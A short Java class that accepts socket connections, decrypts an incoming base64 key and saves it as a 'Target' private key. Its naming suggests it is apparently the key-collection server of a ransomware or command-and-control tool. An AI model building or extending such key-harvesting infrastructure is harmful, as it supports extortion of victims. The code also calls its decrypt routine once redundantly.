package onion.aluka;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.Socket;

import onion.aluka.core.EntityManager;
import onion.aluka.datas.Target;
import onion.aluka.datas.TargetRepository;


public class ClientManager implements Runnable {

	//Variables
	private Socket socket;
	private static EntityManager entityManager = EntityManager.getInstance();
	private TargetRepository targetRepository;
	
	
	public ClientManager(Socket socket,TargetRepository targetRepository) {
		this.socket = socket;
		this.targetRepository = targetRepository;
	}

	@Override
	public void run() {
		try(BufferedInputStream bis = new BufferedInputStream(this.socket.getInputStream())) {
			int l;
			byte[] bytes = new byte[1024];
			String keyBase64 = "";
			while((l=bis.read(bytes)) > 0) {
				keyBase64 += new String(bytes,0,l);
			}
			entityManager.decryptByte(keyBase64);
			
			//Making target
			Target target = new Target();
			keyBase64 = entityManager.decryptByte(keyBase64);
			target.setPrivateKey(keyBase64);
			targetRepository.save(target);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
